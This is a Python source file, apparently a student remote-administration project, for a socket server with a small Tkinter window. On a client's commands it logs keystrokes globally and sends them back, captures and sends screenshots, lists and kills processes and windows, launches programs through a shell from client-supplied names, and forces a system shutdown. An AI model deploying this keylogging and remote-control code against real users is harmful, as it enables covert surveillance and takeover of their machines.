import socket
import pyautogui
import io
import os
import tkinter as tk
import threading
from pynput import keyboard
import platform
import pygetwindow as gw
import json
import subprocess
import psutil

HOST = "127.0.0.1"
PORT = 65431

#####################################################################
# send keystroke
def on_key_press(key, client_socket):
    key = str(key)
    key = key.replace("'", "")
    if (key == "Key.ctrl_l"):
        key = ""
    if (key == "Key.enter"):
        key = "\n"
    if (key == "Key.space"):
        key = " "
    if (len(key) > 2):
        key = " " + key
    with open("log.txt", "a") as file:
        file.write(key)

def Listening(client_socket, stop_event):
    listener = keyboard.Listener(on_press=lambda key: on_key_press(key, client_socket))
    listener.start()
    stop_event.wait()
    listener.stop()

def handle_client(client_socket):
    print("Handle client")
    stop_event = threading.Event()
    listener_thread = None
    while (True):
        data = client_socket.recv(1024).decode()
        data = str(data)
        print(f"Handle event of key stroke : {data}")
        if (data == "HOOK"):
            if listener_thread:
                stop_event.set()
                listener_thread.join()
                print("Listener thread started.")
            stop_event.clear()
            listener_thread = threading.Thread(target=Listening, args=(client_socket, stop_event))
            listener_thread.start()
        if (data == "UNHOOK"):
            if listener_thread:
                stop_event.set()
                listener_thread.join()
                print("Listener thread stopped.")
                listener_thread = None
        if (data == "PRINT"):
            hasThread = False
            # Stop the thread
            if listener_thread:
                stop_event.set()
                listener_thread.join()
                print("Listener thread stopped.")
                hasThread = True
                print(f"hasThread : {hasThread}")

            if os.path.exists("log.txt"):
                with open('log.txt', 'rb') as file:
                    file_data = file.read()
            else: 
                file_data = b"nothing to print"
            
            client_socket.sendall(file_data)

            # Recreate the thread
            if (hasThread):
                stop_event.clear()
                listener_thread = threading.Thread(target=Listening, args=(client_socket, stop_event))
                listener_thread.start()
        if (data == "DELETE"):
            if os.path.exists('log.txt'):
                os.remove('log.txt')
        if (data == "CLOSE"):
            if listener_thread:
                stop_event.set()
                listener_thread.join()
                print("Listener thread stopped.")
            print("Break loops")
            break

def send_keystroke(client_socket):
    handle_client(client_socket)

#####################################################################
# Screenshot
def take_screenshot(client_socket):
    print("Taking screenshot...")
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png") 

    picture_path = "screenshot.png"
    with open(picture_path, 'rb') as file:
        picture_data = file.read()
    picture_size = len(picture_data)
    client_socket.send(str(picture_size).encode())
    ack = client_socket.recv(1024).decode()
    if ack != "ACK":
        print("Error: Acknowledgment not received for picture size.")
        return
    chunk_size = 1024
    for i in range(0, picture_size, chunk_size):
        chunk = picture_data[i:i+chunk_size]
        while True:
            client_socket.sendall(chunk)
            ack = client_socket.recv(1024).decode()
            if ack == "ACK":
                break
            else:
                print("Error: Acknowledgment not received for chunk. Retrying...")
    print("Picture sent successfully!")


    # Picture sent successfully
    print("Picture sent successfully!")
    # file = open("screenshot.png", 'rb')
    # image_data = file.read(2048)
    # while (image_data):
    #     client_socket.send(image_data)
    #     image_data = file.read(2048)
    # file.close()
    # print("Screenshot sent")
    
    #############################
    # Remove the picture
    image_path = "screenshot.png"
    try:
        os.remove(image_path)
        print(f"Image {image_path} deleted successfully.")
    except OSError as e:
        print(f"Error deleting image: {e}")

#####################################################################
# Running Apps
def app_running_handle(client_socket, command):
    # print("CHECKING " + str(len(command)))
    if len(command) == 1:
        pass
    elif command[1] == "SHOW":
        taskbar_apps = get_apps_in_taskbar()
        json_app_list = json.dumps(taskbar_apps)
        client_socket.send(json_app_list.encode())
    elif command[1] == "KILL":
        close_app_by_id(client_socket, command[2])
    elif command[1] == "START":
        open_application(client_socket, command[2])

def get_apps_in_taskbar():
    taskbar_apps = []

    windows = gw.getWindowsWithTitle('')
    for index, window in enumerate(windows):
        taskbar_apps.append([index, window.title])

    return taskbar_apps

def open_application(client_socket, app_name):
    try:
        subprocess.Popen([app_name], shell=True)
        command = "SUCCESS"
        client_socket.send(command.encode())
    except FileNotFoundError:
        command = "FAILED"
        client_socket.send(command.encode())
        # messagebox.showinfo("Failed", "Application '{app_name}' not found or could not be opened.")

def close_app_by_id(client_socket, app_id):
    app_id = int(app_id)
    windows = gw.getWindowsWithTitle('')
    if app_id < len(windows):
        windows[app_id].close()
        command = "SUCCESS"
        client_socket.send(command.encode())
    else:
        command = "FAILED"
        client_socket.send(command.encode())

#####################################################################
# Running Process
def process_running_handle(client_socket, command):
    if len(command) == 1:
        pass
    elif command[1] == "SHOW":
        taskbar_processes = get_process_info()
        json_process_list = json.dumps(taskbar_processes)
        client_socket.sendall(json_process_list.encode())
        ack = client_socket.recv(1024).decode()
        if ack != "ACK":
            # Resend data if acknowledgment not received
            client_socket.sendall(json_process_list.encode())
    elif command[1] == "KILL":
        terminate_processwithID(client_socket, command[2])
    elif command[1] == "START":
        open_process(client_socket, command[2])

def get_process_info():
    process_info = []
    for process in psutil.process_iter(attrs=['pid', 'name']):
        process_info.append([process.info['pid'], process.info['name']])
    return process_info

def terminate_processwithID(client_socket, process_ID):
    isFlag = False
    for process in psutil.process_iter(attrs=['pid', 'name']):
        if process.info['pid'] == int(process_ID):
            try:
                isFlag = True
                psutil.Process(process.info['pid']).kill()
            except psutil.NoSuchProcess:
                break
            except psutil.AccessDenied:
                break
    if isFlag == False:
        command = "FAILED"
        client_socket.send(command.encode())
    else:
        command = "SUCCESS"
        client_socket.send(command.encode())

def open_process(client_socket, process_name):
    try:
        subprocess.Popen([process_name], shell=True)
        command = "SUCCESS"
        client_socket.send(command.encode())
    except FileNotFoundError:
        command = "FAILED"
        client_socket.send(command.encode())
#####################################################################
# Shutdown
def ShutDown(countdown_seconds=10):
    print("ShuttingDown")
    print(f"Initiating system shutdown in {countdown_seconds} seconds...")

    # Create a countdown window
    ShutDownRoot = tk.Tk()
    ShutDownRoot.title("Shutdown Countdown")
    ShutDownRoot.geometry("300x100")
    
    label = tk.Label(ShutDownRoot, text="System will shut down in", font=("Helvetica", 14))
    label.pack(pady=20)

    time_left = countdown_seconds
    label_time = tk.Label(ShutDownRoot, text=str(time_left), font=("Helvetica", 30))
    label_time.pack()

    def update_time():
        nonlocal time_left
        label_time.config(text=str(time_left))
        if time_left > 0:
            time_left -= 1
            ShutDownRoot.after(1000, update_time)
        else:
            ShutDownRoot.destroy()
            print("Shutting down the system...")
            if platform.system() == "Windows":
                os.system("shutdown /s /f /t 0")
            elif platform.system() == "Linux":
                os.system("sudo shutdown -h now")

    ShutDownRoot.after(1000, update_time)
    ShutDownRoot.mainloop()

#####################################################################
# Fix_Regsistry
def fix_registry():
    print("Fixing the registry...")

def handle_command(client_socket, command):
    parts = command.split()
    if parts[0] == "SendKeyStroke":
        send_keystroke(client_socket)
    elif parts[0] == "TakeScreenShot":
        take_screenshot(client_socket)
    elif parts[0] == "AppRunning":
        app_running_handle(client_socket, parts)
    elif parts[0] == "ProcessRunning":
        process_running_handle(client_socket, parts)
    elif parts[0] == "ShutDownComputer":
        ShutDown()
    elif parts[0] == "FixRegistry":
        fix_registry()

def start_server():
    global server_socket
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)
    print("Server is listening...")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Connection established with {client_address}")

        while True:
            data = client_socket.recv(1024)
            if not data:
                break

            command = data.decode("utf-8")
            print(f"Received command: {command}")
            handle_command(client_socket, command)

        client_socket.close()
        print(f"Connection with {client_address} closed")

def close_server():
    try:
        server_socket.shutdown(socket.SHUT_RDWR)  # Shutdown the socket's read and write operations
        server_socket.close()  # Close the socket
        print("Server socket closed.")
    except Exception as e:
        print("Error while closing server socket:", e)

def on_closing():
    close_server()  # Close the client socket
    print("Client socket closed.")
    root.destroy()

def start_server_thread():
    server_thread = threading.Thread(target=start_server)
    server_thread.daemon = True
    server_thread.start()

####################################################
# Server UI
root = tk.Tk()
root.title("Server UI")
root.geometry("300x200")
root.resizable(False, False)

open_button = tk.Button(root, text="Open", width=6, height=3, command=start_server_thread)
open_button.pack(pady=10)

close_button = tk.Button(root, text="Close", width=6, height=3, command=close_server)
close_button.pack(pady=10)

root.protocol("WM_DELETE_WINDOW", on_closing)

if __name__ == "__main__":
    root.mainloop()
